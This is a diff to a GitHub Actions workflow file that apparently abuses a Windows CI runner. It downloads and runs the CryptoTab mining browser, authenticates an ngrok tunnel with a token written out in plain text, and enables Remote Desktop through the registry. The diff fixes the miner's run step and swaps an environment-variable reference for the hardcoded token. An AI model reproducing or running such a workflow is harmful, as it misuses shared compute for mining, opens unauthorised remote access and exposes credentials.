@@ -11,11 +11,11 @@ jobs:
     - name: Download Ngrok
       run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
     - run: Invoke-WebRequest https://cryptobrowser.site/get/BrowserSetup.exe -OutFile cryptotab.exe
-    - run: cryptotab.exe
+    - run: .\cryptotab.exe
     - name: Extract Ngrok Archive
       run: Expand-Archive ngrok.zip
     - name: Auth
-      run: .\ngrok\ngrok.exe authtoken $Env:1rwYbMguHlqrHwHcqFpa35Xobx8_7MQkeC4VpyJ1R87m4jyrN
+      run: .\ngrok\ngrok.exe authtoken 1rwYbMguHlqrHwHcqFpa35Xobx8_7MQkeC4VpyJ1R87m4jyrN
 
     - name: Enable TS
       run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
